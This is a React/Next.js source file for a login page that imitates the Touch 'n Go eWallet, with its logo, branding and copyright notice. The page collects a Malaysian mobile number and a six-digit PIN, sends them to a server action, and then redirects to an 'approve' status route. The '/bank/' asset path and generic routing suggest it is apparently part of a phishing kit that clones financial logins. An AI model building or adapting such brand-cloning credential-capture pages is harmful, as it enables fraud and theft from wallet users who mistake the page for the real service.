"use client";

import { useState, useRef } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { submitLogin } from "@/lib/action";
import { ArrowLeft } from "lucide-react";

export default function TouchNGoLogin() {
  const router = useRouter();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [pin, setPin] = useState(["", "", "", "", "", ""]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handlePinChange = (index: number, value: string) => {
    // Only allow numbers
    if (!/^\d*$/.test(value)) return;
    
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    // Focus next input if value is entered
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    const fullPin = pin.join("");
    
    if (!phoneNumber) {
      setError("Mobile number is required.");
      setIsLoading(false);
      return;
    }
    
    if (fullPin.length !== 6) {
      setError("Please enter a 6-digit PIN.");
      setIsLoading(false);
      return;
    }

    try {
      const fullPhoneNumber = `+60${phoneNumber}`;
      const response = await submitLogin(fullPhoneNumber, fullPin);
      if (response.success) {
        router.push("/b/status/approve");
      } else {
        // Handle validation errors from server
        setError(response.errors?.phoneNumber || response.errors?.pin || "Login failed");
      }
    } catch (err) {
      setError("An unexpected error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  // Check if inputs are valid for button enablement
  const isFormValid = phoneNumber.length >= 8 && pin.join("").length === 6;

  return (
    <div className="min-h-[100dvh] bg-gradient-to-b from-[#56a7d5] via-[#4878c4] to-[#3a4db2] flex flex-col items-center justify-between px-6 py-8 font-sans relative overflow-hidden">
      {/* Header with Back Button */}
      <div className="w-full max-w-md mx-auto flex items-center justify-start z-20">
        <button 
          onClick={() => router.back()}
          className="text-white p-2 -ml-2 rounded-full hover:bg-white/10 transition-colors"
          aria-label="Go back"
        >
          <ArrowLeft className="w-6 h-6" />
        </button>
      </div>

      <div className="w-full max-w-md mx-auto flex-1 flex flex-col mt-4 z-10">
        {/* Logo */}
        <div className="flex justify-center mb-14">
          <div className="bg-white p-1.5 rounded-[1.25rem] shadow-lg inline-block">
            <Image 
              src="/bank/Touch_'n_Go_logo.svg" 
              alt="Touch 'n Go" 
              width={100} 
              height={64}
              className="rounded-xl overflow-hidden"
              priority
            />
          </div>
        </div>

        <form onSubmit={handleSubmit} className="flex flex-col gap-8">
          {/* Login section */}
          <div>
            <h2 className="text-white text-base font-medium mb-3">Login</h2>
            <div className="flex items-center border-b border-white/50 pb-2">
              <div className="flex items-center text-white mr-3">
                <span className="text-base font-medium">+60</span>
                <svg className="w-4 h-4 ml-1 opacity-80" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M19 9l-7 7-7-7"></path>
                </svg>
              </div>
              <div className="w-[1px] h-5 bg-white/40 mr-3"></div>
              <input 
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                placeholder="Mobile Number"
                className="flex-1 bg-transparent text-white placeholder-white/60 outline-none text-base font-medium"
              />
              <button type="button" className="text-white/80 ml-2 hover:text-white transition-colors">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
              </button>
            </div>
          </div>

          {/* PIN section */}
          <div>
            <h2 className="text-white text-base font-medium mb-3">6-digit PIN</h2>
            <div className="flex justify-between gap-2">
              {pin.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => { inputRefs.current[index] = el; }}
                  type="password"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handlePinChange(index, e.target.value)}
                  onKeyDown={(e) => handlePinKeyDown(index, e)}
                  className="w-[3rem] h-[3.25rem] bg-white/20 border border-white/30 rounded-lg text-center text-white text-xl focus:outline-none focus:border-white focus:bg-white/30 transition-all shadow-inner"
                />
              ))}
            </div>
            <div className="flex justify-end mt-3">
              <button type="button" className="text-white text-sm font-medium hover:underline">
                Forget your PIN?
              </button>
            </div>
          </div>

          {error && <p className="text-red-200 text-sm text-center -mt-2">{error}</p>}

          {/* Submit button */}
          <button 
            type="submit" 
            disabled={!isFormValid || isLoading}
            className={`mt-4 w-full py-3.5 rounded-[2rem] text-white font-bold text-lg transition-all shadow-md
              ${isFormValid && !isLoading 
                ? "bg-white/30 hover:bg-white/40 border border-white/30" 
                : "bg-white/20 border border-white/10 opacity-70 cursor-not-allowed"}`}
          >
            {isLoading ? "Logging in..." : "Log In"}
          </button>
        </form>
      </div>

      {/* Footer */}
      <div className="text-white/70 text-xs mt-auto pt-8 z-10 font-medium">
        Copyright © 2026 TNG Digital Sdn Bhd.
      </div>
    </div>
  );
}
